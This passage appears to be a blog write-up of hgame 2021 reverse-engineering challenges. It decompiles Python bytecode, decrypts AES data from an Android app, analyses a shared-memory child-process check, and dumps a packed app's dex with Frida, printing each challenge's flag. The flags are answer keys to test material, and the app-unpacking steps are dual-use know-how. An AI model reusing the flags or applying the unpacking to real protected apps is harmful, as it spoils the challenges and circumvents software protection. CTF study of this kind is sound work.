class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">4</span>           <span class="number">0</span> LOAD_GLOBAL              <span class="number">0</span> (input)</span><br><span class="line">              <span class="number">2</span> LOAD_CONST               <span class="number">1</span> (<span class="string">'give me your flag:\n'</span>)</span><br><span class="line">              <span class="number">4</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">              <span class="number">6</span> STORE_FAST               <span class="number">0</span> (raw_flag) <span class="comment">#raw_flag = input('give me your flag:\n')</span></span><br><span class="line"></span><br><span class="line">  <span class="number">5</span>           <span class="number">8</span> LOAD_GLOBAL              <span class="number">1</span> (list)</span><br><span class="line">             <span class="number">10</span> LOAD_FAST                <span class="number">0</span> (raw_flag)</span><br><span class="line">             <span class="number">12</span> LOAD_CONST               <span class="number">2</span> (<span class="number">6</span>)</span><br><span class="line">             <span class="number">14</span> LOAD_CONST               <span class="number">3</span> (<span class="number">-1</span>)</span><br><span class="line">             <span class="number">16</span> BUILD_SLICE              <span class="number">2</span></span><br><span class="line">             <span class="number">18</span> BINARY_SUBSCR</span><br><span class="line">             <span class="number">20</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">22</span> STORE_FAST               <span class="number">1</span> (cipher)<span class="comment">#cipher = list(raw_flag[6:-1])</span></span><br><span class="line"></span><br><span class="line">  <span class="number">6</span>          <span class="number">24</span> LOAD_GLOBAL              <span class="number">2</span> (len)</span><br><span class="line">             <span class="number">26</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">             <span class="number">28</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">30</span> STORE_FAST               <span class="number">2</span> (length)<span class="comment">#length = len(cipher)</span></span><br><span class="line"></span><br><span class="line">  <span class="number">8</span>          <span class="number">32</span> LOAD_GLOBAL              <span class="number">3</span> (range)</span><br><span class="line">             <span class="number">34</span> LOAD_FAST                <span class="number">2</span> (length)</span><br><span class="line">             <span class="number">36</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">38</span> BINARY_FLOOR_DIVIDE</span><br><span class="line">             <span class="number">40</span> CALL_FUNCTION            <span class="number">1</span><span class="comment">#range(length/2)</span></span><br><span class="line">             <span class="number">42</span> GET_ITER</span><br><span class="line">        &gt;&gt;   <span class="number">44</span> FOR_ITER                <span class="number">54</span> (to <span class="number">100</span>)</span><br><span class="line">             <span class="number">46</span> STORE_FAST               <span class="number">3</span> (i)<span class="comment">#for i in range(length/2):</span></span><br><span class="line"></span><br><span class="line">  <span class="number">9</span>          <span class="number">48</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">             <span class="number">50</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">52</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">             <span class="number">54</span> BINARY_MULTIPLY</span><br><span class="line">             <span class="number">56</span> LOAD_CONST               <span class="number">5</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">58</span> BINARY_ADD</span><br><span class="line">             <span class="number">60</span> BINARY_SUBSCR<span class="comment">#cipher[2*i+1]</span></span><br><span class="line">             <span class="number">62</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">             <span class="number">64</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">66</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">             <span class="number">68</span> BINARY_MULTIPLY</span><br><span class="line">             <span class="number">70</span> BINARY_SUBSCR<span class="comment">#cipher[2*i]</span></span><br><span class="line">             <span class="number">72</span> ROT_TWO<span class="comment">#swap 改变指针的指向来实现</span></span><br><span class="line">             <span class="number">74</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">             <span class="number">76</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">78</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">             <span class="number">80</span> BINARY_MULTIPLY</span><br><span class="line">             <span class="number">82</span> STORE_SUBSCR</span><br><span class="line">             <span class="number">84</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">             <span class="number">86</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">88</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">             <span class="number">90</span> BINARY_MULTIPLY</span><br><span class="line">             <span class="number">92</span> LOAD_CONST               <span class="number">5</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">94</span> BINARY_ADD</span><br><span class="line">             <span class="number">96</span> STORE_SUBSCR<span class="comment">#cipher[2*i], cipher[2*i+1] = cipher[2*i+1], cipher[2*i]</span></span><br><span class="line">             <span class="number">98</span> JUMP_ABSOLUTE           <span class="number">44</span></span><br><span class="line"><span class="comment">#for i in range(length/2):</span></span><br><span class="line"><span class="comment">#cipher[2*i], cipher[2*i+1] = cipher[2*i+1], cipher[2*i]</span></span><br><span class="line"></span><br><span class="line"> <span class="number">12</span>     &gt;&gt;  <span class="number">100</span> BUILD_LIST               <span class="number">0</span></span><br><span class="line">            <span class="number">102</span> STORE_FAST               <span class="number">4</span> (res)<span class="comment">#res = []</span></span><br><span class="line"></span><br><span class="line"> <span class="number">13</span>         <span class="number">104</span> LOAD_GLOBAL              <span class="number">3</span> (range)</span><br><span class="line">            <span class="number">106</span> LOAD_FAST                <span class="number">2</span> (length)</span><br><span class="line">            <span class="number">108</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">110</span> GET_ITER</span><br><span class="line">        &gt;&gt;  <span class="number">112</span> FOR_ITER                <span class="number">26</span> (to <span class="number">140</span>)</span><br><span class="line">            <span class="number">114</span> STORE_FAST               <span class="number">3</span> (i)<span class="keyword">for</span> i <span class="keyword">in</span> range(length)</span><br><span class="line"></span><br><span class="line"> <span class="number">14</span>         <span class="number">116</span> LOAD_FAST                <span class="number">4</span> (res)</span><br><span class="line">            <span class="number">118</span> LOAD_METHOD              <span class="number">4</span> (append)</span><br><span class="line">            <span class="number">120</span> LOAD_GLOBAL              <span class="number">5</span> (ord)</span><br><span class="line">            <span class="number">122</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">            <span class="number">124</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">            <span class="number">126</span> BINARY_SUBSCR</span><br><span class="line">            <span class="number">128</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">130</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">            <span class="number">132</span> BINARY_XOR</span><br><span class="line">            <span class="number">134</span> CALL_METHOD              <span class="number">1</span><span class="comment">#res.append(ord(cipher[i])^i)</span></span><br><span class="line">            <span class="number">136</span> POP_TOP</span><br><span class="line">            <span class="number">138</span> JUMP_ABSOLUTE          <span class="number">112</span></span><br><span class="line"></span><br><span class="line"> <span class="number">15</span>     &gt;&gt;  <span class="number">140</span> LOAD_GLOBAL              <span class="number">6</span> (bytes)</span><br><span class="line">            <span class="number">142</span> LOAD_FAST                <span class="number">4</span> (res)</span><br><span class="line">            <span class="number">144</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">146</span> LOAD_METHOD              <span class="number">7</span> (hex)</span><br><span class="line">            <span class="number">148</span> CALL_METHOD              <span class="number">0</span></span><br><span class="line">            <span class="number">150</span> STORE_FAST               <span class="number">4</span> (res)<span class="comment">#res = bytes(res).hex()</span></span><br><span class="line"></span><br><span class="line"> <span class="number">16</span>         <span class="number">152</span> LOAD_GLOBAL              <span class="number">8</span> (<span class="keyword">print</span>)</span><br><span class="line">            <span class="number">154</span> LOAD_CONST               <span class="number">6</span> (<span class="string">'your flag: '</span>)</span><br><span class="line">            <span class="number">156</span> LOAD_FAST                <span class="number">4</span> (res)</span><br><span class="line">            <span class="number">158</span> BINARY_ADD</span><br><span class="line">            <span class="number">160</span> CALL_FUNCTION            <span class="number">1</span><span class="comment">#print('your flag: ' + res)</span></span><br><span class="line">            <span class="number">162</span> POP_TOP</span><br><span class="line">            <span class="number">164</span> LOAD_CONST               <span class="number">0</span> (<span class="literal">None</span>)</span><br><span class="line">            <span class="number">166</span> RETURN_VALUE</span><br><span class="line"></span><br><span class="line"><span class="comment"># your flag: 30466633346f59213b4139794520572b45514d61583151576638643a</span></span><br></pre></td></tr></table></figure><p>最后简单逆一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">'30466633346f59213b4139794520572b45514d61583151576638643a'</span></span><br><span class="line">enc = bytes.fromhex(enc)</span><br><span class="line">flag = [b^i <span class="keyword">for</span> b, i <span class="keyword">in</span> enumerate(enc)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)//<span class="number">2</span>):</span><br><span class="line">    flag[<span class="number">2</span>*i], flag[<span class="number">2</span>*i+<span class="number">1</span>] = flag[<span class="number">2</span>*i+<span class="number">1</span>], flag[<span class="number">2</span>*i]</span><br><span class="line">print(<span class="string">''</span>.join(map(chr, flag)))</span><br><span class="line"><span class="comment">#G00dj0&amp;_H3r3-I$Y@Ur_$L@G!~!~</span></span><br></pre></td></tr></table></figure><h3 id="ezApk"><a href="#ezApk" class="headerlink" title="ezApk"></a>ezApk</h3><p>简单的安卓，只有java代码，找到按钮活动。</p><p><img src="https://i.loli.net/2021/02/27/56TDYkbSyOjLNpK.png" alt="image-20210215155612517"></p><p>就是取出文本内容，然后把输入和密文传入s方法，验证是否正确。</p><p>到s方法：一个cbc模式的aes加密，填充方式为PKCS7Padding。</p><p><img src="https://i.loli.net/2021/02/27/hcqCNUm63VFPaZR.png" alt="image-20210215155952276"></p><p>所以解密密文就应该是flag了，使用java用同样的方式调用一下解密方法。这里注意一点就是：java中自带的是PKCS5Padding填充，直接使用PKCS7Padding会报错，但搜索到这2个使用起来是一样的，就直接改成PKCS5Padding就好了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ctf;</span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidAlgorithmParameterException;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.crypto.BadPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.IllegalBlockSizeException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.NoSuchPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cry</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] hash(String a, String b) <span class="keyword">throws</span> NoSuchAlgorithmException, UnsupportedEncodingException&#123;</span><br><span class="line">MessageDigest v2 = MessageDigest.getInstance(a);</span><br><span class="line"><span class="keyword">byte</span>[] v3 = b.getBytes(<span class="string">"UTF-8"</span>);</span><br><span class="line"><span class="keyword">byte</span>[] ans = v2.digest(v3);</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">aes_test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchAlgorithmException, UnsupportedEncodingException, NoSuchPaddingException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException</span>&#123;</span><br><span class="line"></span><br><span class="line">String key = <span class="string">"A_HIDDEN_KEY"</span>;</span><br><span class="line">String input = <span class="string">"EEB23sI1Wd9Gvhvk1sgWyQZhjilnYwCi5au1guzOaIg5dMAj9qPA7lnIyVoPSdRY"</span>;</span><br><span class="line">Base64.Decoder decoder = Base64.getDecoder();</span><br><span class="line"><span class="keyword">byte</span>[] enc = decoder.decode(input);</span><br><span class="line">SecretKeySpec v1 = <span class="keyword">new</span> SecretKeySpec(cry.hash(<span class="string">"SHA-256"</span>, key), <span class="string">"AES"</span>);</span><br><span class="line">IvParameterSpec v2 = <span class="keyword">new</span> IvParameterSpec(cry.hash(<span class="string">"MD5"</span>, key));</span><br><span class="line">Cipher v5 = Cipher.getInstance(<span class="string">"AES/CBC/PKCS5Padding"</span>);</span><br><span class="line">v5.init(<span class="number">2</span>, v1, v2);</span><br><span class="line">System.out.println(<span class="string">"key: "</span> + byte_hex.bytes2hex(v1.getEncoded()));</span><br><span class="line">System.out.println(<span class="string">"iv: "</span> + byte_hex.bytes2hex(v2.getIV()));</span><br><span class="line"><span class="keyword">byte</span>[] plain = v5.doFinal(enc);</span><br><span class="line">System.out.println(<span class="keyword">new</span> String(plain));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">key: fca5fed0bc096dbb2f21c64b77a908b5c9944dfcaba05a482b2424a44a15ffe6</span></span><br><span class="line"><span class="comment">iv: 99c6bd34c31b78b4c4b964a7745e6300</span></span><br><span class="line"><span class="comment">hgame&#123;jUst_A_3z4pp_write_in_k07l1n&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>其实也不用这么麻烦的，关键是想练习一下java。</p><p>自己算一下hash得到的key和iv用python或者在线网站解密一下，方便的多。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AesEncry</span><span class="params">(object)</span>:</span></span><br><span class="line">    key = <span class="string">'fca5fed0bc096dbb2f21c64b77a908b5c9944dfcaba05a482b2424a44a15ffe6'</span></span><br><span class="line">    key = bytes.fromhex(key)                            </span><br><span class="line">    </span><br><span class="line">    iv = <span class="string">'99c6bd34c31b78b4c4b964a7745e6300'</span></span><br><span class="line">    iv = bytes.fromhex(iv)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        mode = AES.MODE_ECB</span><br><span class="line">        padding = <span class="keyword">lambda</span> s: s + (<span class="number">16</span> - len(s) % <span class="number">16</span>) * chr(<span class="number">16</span> - len(s) % <span class="number">16</span>)</span><br><span class="line">        cryptos = AES.new(self.key, mode)</span><br><span class="line">        cipher_text = cryptos.encrypt(data)</span><br><span class="line">        <span class="keyword">return</span> cipher_text.hex()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        cryptos = AES.new(self.key, AES.MODE_CBC, self.iv)</span><br><span class="line">        decrpytBytes = base64.b64decode(data)</span><br><span class="line">        plaint = cryptos.decrypt(decrpytBytes)</span><br><span class="line">        <span class="keyword">return</span> plaint</span><br><span class="line"></span><br><span class="line">enc = <span class="string">'EEB23sI1Wd9Gvhvk1sgWyQZhjilnYwCi5au1guzOaIg5dMAj9qPA7lnIyVoPSdRY'</span></span><br><span class="line">flag = AesEncry().decrypt(enc)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="helloRe2"><a href="#helloRe2" class="headerlink" title="helloRe2"></a>helloRe2</h3><p>首先输入pass1的逻辑，转化一个128位的大数与指定大数比较，然后以挂起创建自身进程的子进程，调用CreateFileMappingA()函数把文件映像到内存，再使用MapViewOfFile()函数把文件视映像到进程地址空间上（用于把当前进程的内存空间的数据与子进程共享），然后在非调试状态下对要共享的数据简单的异或加密一下，最后恢复启动刚刚创建的子进程，自身进程睡眠挂起：</p><p><img src="https://i.loli.net/2021/02/27/kRrY7a6meKp59Pz.png" alt="image-20210215190636690"></p><p>子进程启动后，调用OpenFileMappingA()与MapViewOfFile()查看父进程共享的内存数据，若存在则调用输入pass2的逻辑，然后一个cbc模式的aes加密。</p><p><img src="https://i.loli.net/2021/02/27/Gna2KV58FQRH7oc.png" alt="image-20210215191030835"></p><p>使用python解密一下得到pass2：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = <span class="string">b'2b0c5e6a3a20b189'</span></span><br><span class="line">key = [key[i]^i <span class="keyword">for</span> i <span class="keyword">in</span> range(len(key))]</span><br><span class="line">key = bytes(key)</span><br><span class="line"><span class="comment">#key = bytes.fromhex(key)                            </span></span><br><span class="line"></span><br><span class="line">iv = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>]</span><br><span class="line">iv = bytes(iv)</span><br><span class="line"><span class="comment">#iv = bytes.fromhex(iv)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(data)</span>:</span></span><br><span class="line">    mode = AES.MODE_ECB</span><br><span class="line">    padding = <span class="keyword">lambda</span> s: s + (<span class="number">16</span> - len(s) % <span class="number">16</span>) * chr(<span class="number">16</span> - len(s) % <span class="number">16</span>)</span><br><span class="line">    cryptos = AES.new(self.key, mode)</span><br><span class="line">    cipher_text = cryptos.encrypt(data)</span><br><span class="line">    <span class="keyword">return</span> cipher_text.hex()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(data)</span>:</span></span><br><span class="line">    cryptos = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    decrpytBytes = base64.b64decode(data)</span><br><span class="line">    plaint = cryptos.decrypt(decrpytBytes)</span><br><span class="line">    <span class="keyword">return</span> plaint</span><br><span class="line"></span><br><span class="line">enc = <span class="string">'t/7+2Qd2eWU/Tl9i1QL2fg=='</span></span><br><span class="line">flag = decrypt(enc)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#7a4ad6c5671fb313</span></span><br></pre></td></tr></table></figure><p>最后：<strong>hgame{2b0c5e6a3a20b189_7a4ad6c5671fb313}</strong></p><h3 id="fake-debugger-beta"><a href="#fake-debugger-beta" class="headerlink" title="fake_debugger beta"></a>fake_debugger beta</h3><p>nc连上后，空格加回车进行单步调试。</p><p>容易发现，是对输入一位一位的异或加密后与指定值比较，不对则退出。</p><p><img src="https://i.loli.net/2021/02/27/SMEapnGisTgZIWl.png" alt="image-20210216180859920"></p><p>开始的格式是知道的，所以后面一位一位慢慢的跟一下就好了。</p><p><strong>hgame{You_Kn0w_debuGg3r}</strong></p><h3 id="gun"><a href="#gun" class="headerlink" title="gun"></a>gun</h3><p>jadx反编译后没有发现MainActivity，但从几个特征可以知道app进行梆梆加固免费版进行加固。</p><p><img src="https://i.loli.net/2021/02/27/3xWMP72bsnJ89qe.png" alt="image-20210227105625088"></p><p>我们的目的主要是得到解密后的关键dex分析MainActivity，所以可以直接考虑用frida-dumpdex来dump出内存中的dex。项目地址：<a href="https://github.com/hluwa/FRIDA-DEXDump" target="_blank" rel="noopener">https://github.com/hluwa/FRIDA-DEXDump</a></p><p>搭建frida环境时注意一点：安装的frida的版本要和服务端安装的frida-server版本要一致。</p><p>dump出dex后从到小的拖进jeb中反编译，0xbf03a000.dex是我们要找的。</p><p>可以看到，创建了多个线程进行操作。</p><p><img src="https://i.loli.net/2021/02/27/r6JaDQfPuLT7qCH.png" alt="image-20210227111613020"></p><p>看一下功能：</p><p><img src="https://i.loli.net/2021/02/27/johwg4l5qzErmNb.png" alt="image-20210227111754345"></p><p>继续看fd.i方法：</p><p><img src="https://i.loli.net/2021/02/27/ZiAxb93RSNz7Foa.png" alt="image-20210227112014590"></p><p>到这里基本上就可以知道，是开启多个线程进行发送数据，然后每个线程有不同的睡眠时间，这就有了先后顺序。</p><p>我是直接把所有数据按时间建立关系后，打印出来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> a[<span class="number">0xfffffff</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">a[<span class="number">19530</span>] = <span class="string">'q'</span>, a[<span class="number">0x75F4</span>] = <span class="string">'e'</span>, a[<span class="number">0xA161</span>] = <span class="string">'d'</span>, a[<span class="number">7337</span>] = <span class="string">'f'</span>;</span><br><span class="line">a[<span class="number">0x5B0D</span>] = <span class="string">'e'</span>, a[<span class="number">0xC266</span>] = <span class="string">'x'</span>, a[<span class="number">0x887F</span>] = <span class="string">'q'</span>, a[<span class="number">50475</span>] = <span class="string">'u'</span>;</span><br><span class="line">a[<span class="number">0xC05D</span>] = <span class="string">'a'</span>, a[<span class="number">0x909B</span>] = <span class="string">'u'</span>, a[<span class="number">8488</span>] = <span class="string">'a'</span>, a[<span class="number">0xC1CF</span>] = <span class="string">'r'</span>;</span><br><span class="line">a[<span class="number">78545</span>] = <span class="string">'0'</span>, a[<span class="number">0x4B4C</span>] = <span class="string">'t'</span>, a[<span class="number">0xC807</span>] = <span class="string">'q'</span>, a[<span class="number">0x8C9B</span>] = <span class="string">'q'</span>;</span><br><span class="line">a[<span class="number">0xB2B3</span>] = <span class="string">'k'</span>, a[<span class="number">2390</span>] = <span class="string">'z'</span>, a[<span class="number">0x568B</span>] = <span class="string">' '</span>, a[<span class="number">70963</span>] = <span class="string">'y'</span>;</span><br><span class="line">a[<span class="number">0xAF2B</span>] = <span class="string">' '</span>, a[<span class="number">0x397B</span>] = <span class="string">'d'</span>, a[<span class="number">10110</span>] = <span class="string">' '</span>, a[<span class="number">0xFE0D</span>] = <span class="string">'t'</span>;</span><br><span class="line">a[<span class="number">0x33DE</span>] = <span class="string">'q'</span>, a[<span class="number">0xE105</span>] = <span class="string">' '</span>, a[<span class="number">40315</span>] = <span class="string">'b'</span>, a[<span class="number">79438</span>] = <span class="string">'d'</span>;</span><br><span class="line">a[<span class="number">0x54C2</span>] = <span class="string">'e'</span>, a[<span class="number">0xD115</span>] = <span class="string">'y'</span>, a[<span class="number">0x84B9</span>] = <span class="string">'x'</span>, a[<span class="number">0xE4B4</span>] = <span class="string">'q'</span>;</span><br><span class="line">a[<span class="number">28084</span>] = <span class="string">'f'</span>, a[<span class="number">83607</span>] = <span class="string">'&#125;'</span>, a[<span class="number">0x312F</span>] = <span class="string">'e'</span>, a[<span class="number">0x142F0</span>] = <span class="string">'d'</span>;</span><br><span class="line">a[<span class="number">50828</span>] = <span class="string">'z'</span>, a[<span class="number">79540</span>] = <span class="string">'_'</span>, a[<span class="number">60636</span>] = <span class="string">'m'</span>, a[<span class="number">20891</span>] = <span class="string">'b'</span>;</span><br><span class="line">a[<span class="number">0x41D8</span>] = <span class="string">'a'</span>, a[<span class="number">0x18FC</span>] = <span class="string">'m'</span>, a[<span class="number">0xE91A</span>] = <span class="string">'r'</span>, a[<span class="number">0x13F0F</span>] = <span class="string">'I'</span>;</span><br><span class="line">a[<span class="number">0x70B8</span>] = <span class="string">'t'</span>, a[<span class="number">4741</span>] = <span class="string">'m'</span>, a[<span class="number">30778</span>] = <span class="string">' '</span>, a[<span class="number">0xEFA</span>] = <span class="string">'g'</span>;</span><br><span class="line">a[<span class="number">11980</span>] = <span class="string">'q'</span>, a[<span class="number">5130</span>] = <span class="string">'p'</span>, a[<span class="number">0x7F0</span>] = <span class="string">'a'</span>, a[<span class="number">0x13FA7</span>] = <span class="string">'0'</span>;</span><br><span class="line">a[<span class="number">0x4127</span>] = <span class="string">' '</span>, a[<span class="number">0x10D66</span>] = <span class="string">'Q'</span>, a[<span class="number">0x54A</span>] = <span class="string">'O'</span>, a[<span class="number">0xDBA0</span>] = <span class="string">'s'</span>;</span><br><span class="line">a[<span class="number">0x10EE1</span>] = <span class="string">'h'</span>, a[<span class="number">70302</span>] = <span class="string">'x'</span>, a[<span class="number">0x11C08</span>] = <span class="string">'n'</span>, a[<span class="number">0x4831</span>] = <span class="string">' '</span>;</span><br><span class="line">a[<span class="number">0xE33C</span>] = <span class="string">'t'</span>, a[<span class="number">0xFAF4</span>] = <span class="string">' '</span>, a[<span class="number">80538</span>] = <span class="string">'i'</span>, a[<span class="number">0xF4E1</span>] = <span class="string">'u'</span>;</span><br><span class="line">a[<span 